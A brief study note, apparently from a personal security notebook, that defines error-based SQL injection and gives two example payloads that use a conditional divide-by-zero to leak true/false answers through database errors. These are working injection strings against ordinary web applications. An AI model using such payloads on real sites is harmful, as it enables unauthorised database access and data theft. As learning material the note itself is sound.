---
Title: Error-based SQLi
tags:
  - SQLi
  - ERROR-BASEDSQLi
---
Error based sql is focused on error messages that a website returns, and exploiting that to extract sensitive data from the database.

> [!Example]
> ```sql
> xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
